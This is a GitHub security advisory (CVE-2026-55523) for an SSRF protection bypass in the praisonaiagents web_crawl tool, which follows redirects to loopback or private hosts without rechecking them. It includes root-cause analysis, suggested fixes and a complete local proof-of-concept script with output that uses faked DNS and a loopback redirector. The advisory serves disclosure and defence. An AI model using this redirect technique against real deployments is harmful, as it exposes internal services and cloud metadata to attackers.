# [H] praisonaiagents has a `web_crawl` SSRF protection bypass via unchecked redirect targets

## Summary
Severity: High
Advisory: GHSA-8hjw-25cg-g52h
CVE: CVE-2026-55523
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-8hjw-25cg-g52h
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=1.5.128 <1.6.58

## Details
## Summary

`praisonaiagents.tools.web_crawl_tools.web_crawl()` validates the initial URL and blocks direct loopback/private destinations by default, but the default httpx fallback still uses `httpx.Client(follow_redirects=True)` and does not revalidate redirect targets.

An attacker-controlled public URL can pass the initial host check, redirect to loopback/private/cloud metadata infrastructure, and have the redirected response body returned by `web_crawl()`.

This appears to be an incomplete fix / patch bypass for the published `web_crawl` SSRF class (`GHSA-qq9r-63f6-v542` / `CVE-2026-40160`, and `GHSA-8f4v-xfm9-3244`).

## Affected Component

Package:

```text
praisonaiagents
```

File:

```text
src/praisonai-agents/praisonaiagents/tools/web_crawl_tools.py
```

Functions:

```text
web_crawl()
_crawl_with_httpx()
```

## Affected Versions

Validated affected:

- `praisonaiagents 1.5.128` via repository tag `v4.5.128`;
- `praisonaiagents 1.6.40` via repository tag `v4.6.40`;
- `praisonaiagents 1.6.56` via repository tag `v4.6.56`;
- current `origin/main` commit `095653d78a01cc6c80ff5b2dd20a8e5619686ddc`.

Suggested affected range for maintainer confirmation:

```text
>= 1.5.128, <= 1.6.56
```

No patched version is known to me at submission time.

## Root Cause

Current `web_crawl()` validates only the initially supplied URL:

- requires `http` or `https`;
- resolves the initial hostname with `socket.gethostbyname()`;
- rejects loopback/private/link-local/multicast/unspecified addresses unless `ALLOW_LOCAL_CRAWL=true`.

The default fetch sink then follows redirects:

```python
with httpx.Client(follow_redirects=True, timeout=30.0) as client:
    response = client.get(url)
```

There is no validation of intermediate or final redirect destinations before `httpx` fetches them. The URL that passes the guard is therefore not necessarily the URL ultimately requested by the server.

## Local Reproduction

The PoV is local-only. It starts a loopback redirector and a loopback internal service. It monkeypatches DNS in-process so `attacker.test` appears public to the initial guard while the actual test request routes to the local redirector. This avoids contacting any third-party infrastructure while demonstrating the same root cause.

Run from a checkout of the repository:

```fish
env PYTHONPATH=src/praisonai-agents uv run --with httpx poc_web_crawl_redirect_ssrf.py
```

Observed output:

```text
DIRECT_CONTROL: {'error': 'No valid or safe URLs provided. Local and non-http(s) URLs are blocked for security.'}
REDIRECT_RESULT: {'url': 'http://attacker.test:<port>/go', 'content': 'INTERNAL-SECRET-FROM-LOOPBACK', 'title': '', 'provider': 'httpx'}
REDIRECT_SERVER_HIT: True
INTERNAL_SERVER_HIT: True
PRAI-CAND-001 CONFIRMED: web_crawl follows a redirect to loopback
```

The direct control proves direct loopback is blocked by the intended SSRF guard. The redirect case proves the same blocked destination class is reachable after the initial safe-looking URL redirects.

With the same setup but with redirect following disabled, the redirector was hit, but the internal loopback service was not hit:

```text
REDIRECT_HIT: True
INTERNAL_HIT: False
```

## Impact

If an attacker can influence URLs passed to `web_crawl()`, directly or through an agent/tool workflow, they can cause the PraisonAI host to fetch loopback, private-network, or cloud metadata endpoints reachable from that host. The response body is returned in the `web_crawl()` result.

Practical impact includes:

- reading loopback-only HTTP services;
- probing private network services;
- reading cloud metadata endpoints where reachable and not otherwise protected.

This report does not claim RCE, authentication bypass, or live cloud credential theft without a deployment-specific metadata test.

## Severity


This mirrors the CVSS v4.0 shape already used for the prior `web_crawl` SSRF class while accounting for prompt/tool invocation as the attack prerequisite and user interaction. A CVSS v3.1 scoring may reasonably be lower if modeled strictly around user interaction, but the root issue is a server-side network boundary bypass that returns internal response content.

## Suggested Fix

- Set `follow_redirects=False` in `_crawl_with_httpx()`, or handle redirects manually and validate each `Location` target before following it.
- Centralize the URL validation used by server-side fetch tools.
- Validate every resolved address using `socket.getaddrinfo()`, not only the first `gethostbyname()` result.
- Reject loopback, private, link-local, reserved, multicast, unspecified, and cloud metadata destinations.
- Add regression tests for direct loopback, public-to-loopback redirect, and allowed public-to-public redirects if redirect support remains intended.

## PoV

```python
#!/usr/bin/env python3
"""Local PoV for PraisonAI web_crawl redirect-target SSRF bypass.

This PoV uses only loopback servers. It monkeypatches DNS in-process so the initial attacker host looks public to PraisonAI's pre-request guard, while the HTTP request is routed to a local redirect server. The redirect target is a loopback-only internal service. The vulnerable behavior is that web_crawl() validates the initial URL but follows the redirect to loopback without revalidating the Location target.
"""

from __future__ import annotations

import http.server
import os
import socket
import socketserver
import threading
from typing import Any

from praisonaiagents.tools.web_crawl_tools import web_crawl


class InternalHandler(http.server.BaseHTTPRequestHandler):
    body = b"INTERNAL-SECRET-FROM-LOOPBACK"

    def do_GET(self) -> None:  # noqa: N802
        self.server.hit = True  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, *_args: Any) -> None:
        return


class RedirectHandler(http.server.BaseHTTPRequestHandler):
    target = ""

    def do_GET(self) -> None:  # noqa: N802
        self.server.hit = True  # type: ignore[attr-defined]
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()

    def log_message(self, *_args: Any) -> None:
        return


def main() -> int:
    os.environ.pop("ALLOW_LOCAL_CRAWL", None)

    internal = socketserver.TCPServer(("127.0.0.1", 0), InternalHandler)
    internal.hit = False  # type: ignore[attr-defined]
    internal_port = internal.server_address[1]

    RedirectHandler.target = f"http://127.0.0.1:{internal_port}/secret"
    redirect = socketserver.TCPServer(("127.0.0.1", 0), RedirectHandler)
    redirect.hit = False  # type: ignore[attr-defined]
    redirect_port = redirect.server_address[1]

    threading.Thread(target=internal.serve_forever, daemon=True).start()
    threading.Thread(target=redirect.serve_forever, daemon=True).start()

    original_gethostbyname = socket.gethostbyname
    original_getaddrinfo = socket.getaddrinfo

    def fake_gethostbyname(host: str) -> str:
        if host == "attacker.test":
            return "93.184.216.34"
        return original_gethostbyname(host)

    def fake_getaddrinfo(host: str, port: int, *args: Any, **kwargs: Any):
        if host == "attacker.test":
            return original_getaddrinfo("127.0.0.1", port, *args, **kwargs)
        return original_getaddrinfo(host, port, *args, **kwargs)

    socket.gethostbyname = fake_gethostbyname
    socket.getaddrinfo = fake_getaddrinfo
    try:
        direct_control = web_crawl(
            f"http://127.0.0.1:{internal_port}/secret",
            provider="httpx",
        )
        redirect_result = web_crawl(
            f"http://attacker.test:{redirect_port}/go",
            provider="httpx",
        )
    finally:
        socket.gethostbyname = original_gethostbyname
        socket.getaddrinfo = original_getaddrinfo
        redirect.shutdown()
        internal.shutdown()
        redirect.server_close()
        internal.server_close()

    print("DIRECT_CONTROL:", direct_control)
    print("REDIRECT_RESULT:", redirect_result)
    print("REDIRECT_SERVER_HIT:", bool(redirect.hit))  # type: ignore[attr-defined]
    print("INTERNAL_SERVER_HIT:", bool(internal.hit))  # type: ignore[attr-defined]

    if not isinstance(direct_control, dict) or "No valid or safe URLs" not in str(direct_control):
        raise SystemExit("control failed: direct loopback was not blocked")
    if not isinstance(redirect_result, dict):
        raise SystemExit("bypass failed: unexpected result type")
    if "INTERNAL-SECRET-FROM-LOOPBACK" not in str(redirect_result.get("content", "")):
        raise SystemExit("bypass failed: redirect target content was not returned")
    if not bool(redirect.hit) or not bool(internal.hit):  # type: ignore[attr-defined]
        raise SystemExit("bypass failed: expected local servers were not hit")

    print("PRAI-CAND-001 CONFIRMED: web_crawl follows a redirect to loopback")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8hjw-25cg-g52h
- https://nvd.nist.gov/vuln/detail/CVE-2026-55523
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
